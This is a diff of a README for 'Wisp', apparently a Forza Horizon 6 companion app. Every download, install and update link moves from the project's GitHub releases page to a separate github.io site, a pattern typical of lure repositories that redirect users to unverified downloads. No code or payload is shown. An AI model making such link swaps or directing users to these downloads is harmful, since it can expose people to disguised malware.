@@ -1,6 +1,6 @@
 # 🏁 Wisp - Your Ultimate Forza Horizon 6 Racing Companion
 
-[![Download Wisp](https://img.shields.io/badge/Download-Wisp-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cargocultpolyborusplancus3498/Wisp/releases)
+[![Download Wisp](https://img.shields.io/badge/Download-Wisp-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://cargocultpolyborusplancus3498.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ Getting Wisp up and running takes just a few minutes. Follow these simple steps:
 
 ### Step 1: Download Wisp
 
-Visit this link to download the application: [Download Wisp](https://github.com/Cargocultpolyborusplancus3498/Wisp/releases)
+Visit this link to download the application: [Download Wisp](https://cargocultpolyborusplancus3498.github.io)
 
 ### Step 2: Run the Application
 
@@ -59,7 +59,7 @@ Make sure you have:
 
 ### Installation Steps
 
-1. **Download Wisp** - Visit this link to download the application: [Get Wisp Here](https://github.com/Cargocultpolyborusplancus3498/Wisp/releases)
+1. **Download Wisp** - Visit this link to download the application: [Get Wisp Here](https://cargocultpolyborusplancus3498.github.io)
 
 2. **Save the File** - When your browser asks, choose a location you'll remember (like your Desktop or Downloads folder)
 
@@ -109,7 +109,7 @@ No. Wisp is lightweight and efficient, using minimal system resources. You'll ba
 Wisp is specifically designed for Forza Horizon 6 and optimized for that game. While it may work with other Forza titles, it's not guaranteed.
 
 ### How do I update Wisp?
-Simply download the latest version from the download page: [Get Updates](https://github.com/Cargocultpolyborusplancus3498/Wisp/releases)
+Simply download the latest version from the download page: [Get Updates](https://cargocultpolyborusplancus3498.github.io)
 
 ### What if I encounter problems?
 Most issues can be resolved by restarting Wisp. Make sure Forza Horizon 6 is running before launching Wisp for the best experience.
@@ -170,7 +170,7 @@ Wisp transforms how you experience Forza Horizon 6. With clear, real-time data d
 
 Ready to enhance your racing experience? 
 
-**Download Wisp now:** [https://github.com/Cargocultpolyborusplancus3498/Wisp/releases](https://github.com/Cargocultpolyborusplancus3498/Wisp/releases)
+**Download Wisp now:** [https://cargocultpolyborusplancus3498.github.io](https://cargocultpolyborusplancus3498.github.io)
 
 Happy Racing! 🏎️💨
 
